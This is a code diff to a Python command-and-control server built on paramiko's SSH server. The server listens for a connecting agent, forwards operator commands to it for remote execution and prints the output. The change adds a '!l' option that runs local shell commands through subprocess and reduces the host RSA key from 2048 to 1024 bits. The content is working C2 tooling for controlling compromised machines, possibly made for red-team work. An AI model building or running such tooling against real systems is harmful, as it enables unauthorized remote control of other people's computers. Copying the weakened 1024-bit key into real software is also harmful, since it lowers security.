@@ -2,6 +2,7 @@ import paramiko
 import socket
 import argparse
 import sys
+import subprocess
 from time import sleep
 
 parser = argparse.ArgumentParser(description="C2 server configuration to listen for agents")
@@ -23,10 +24,11 @@ class SSHServer (paramiko.ServerInterface):
             return paramiko.AUTH_SUCCESSFUL
         return paramiko.AUTH_FAILED
 
-def main():
+def Main():
     server = "0.0.0.0" #To listen on all interfaces
     port = args.port
-    HOSTKEY = paramiko.RSAKey.generate(2048)
+    HOSTKEY = paramiko.RSAKey.generate(1024)
+    BUFFER_SIZE = 1024 * 4
     SEPARATOR = "<&sep>"
 
     try:
@@ -34,17 +36,17 @@ def main():
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((server, port))
         sock.listen()
-        print(f"[+] Port: {port} | User: {args.user} | Password: {args.password}\n[*] Listening for connections...")
+        print(f"[+] Port: {port} | User: {args.user} | Password: {args.password}\n[*] Listening for C2 activity...\n")
         client, addr = sock.accept()
     except KeyboardInterrupt:
         sys.exit()
 
+    C2_Server = SSHServer()
     C2_Session = paramiko.Transport(client)
     C2_Session.add_server_key(HOSTKEY)
-    server = SSHServer()
-    C2_Session.start_server(server=server)
+    C2_Session.start_server(server=C2_Server)
     conn = C2_Session.accept()
-    print("\n[*] Debug info: " + str(conn)) #Debug info
+    print("[*] Debug info: " + str(conn)) #Debug info
     if conn is None:
         print("[!] Failled authentication.")
         sys.exit()
@@ -61,19 +63,23 @@ def main():
                 head = command.split(" ")[0]
                 if head == "":
                     continue
+                elif head == "!l":
+                    exec = " ".join(command.split(" ")[1:])
+                    local = subprocess.getoutput(exec)
+                    print(local)
                 elif head == "!exit":
                     conn.send(command)
                     sys.exit()
                 else:
                     conn.send(command)
                     incoming()
-            except Exception as ex:
-                print(str(ex))
-                continue
             except KeyboardInterrupt:
                 conn.send("!exit")
                 sys.exit()
-    
+            except Exception as ex:
+                print(str(ex))
+                continue
+            
     def incoming():
         try:
             if (conn.recv_ready() == False):
@@ -81,11 +87,11 @@ def main():
                 incoming()
             else:
                 while conn.recv_ready():
-                    print(conn.recv(4096).decode())
+                    print(conn.recv(BUFFER_SIZE).decode())
         except Exception as ex:
             print(str(ex))
 
     comm_handler()
 
 if __name__ == "__main__":
-    main()
+    Main()
